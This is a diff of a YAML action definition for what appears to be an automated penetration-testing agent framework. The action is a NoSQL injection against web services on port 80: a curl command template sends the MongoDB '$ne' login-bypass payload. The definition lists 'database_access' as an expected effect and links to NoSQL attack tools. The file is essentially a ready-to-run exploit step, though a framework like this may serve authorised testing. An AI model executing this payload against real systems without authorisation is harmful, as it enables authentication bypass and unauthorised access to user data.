@@ -2,15 +2,21 @@ name: nosqli
 category: web
 description: NoSQL injection exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -H 'Content-Type: application/json' -d '{{"username":{{"$ne":""}},"password":{{"$ne":""}}}}'"
-parser: null
+command_template: 'curl -s ''{target_url}'' -H ''Content-Type: application/json''
+  -d ''{{"username":{{"$ne":""}},"password":{{"$ne":""}}}}''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- sqli_confirmed
+- database_access
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "MongoDB: {"$ne":""} bypasses auth, {"$regex":"^a"} extracts data char by char. Common in Node.js/Express apps with MongoDB."
+mechanism: '- [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
+  - [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-At'
+hacktricks_ref: pentesting-web/nosql-injection.md
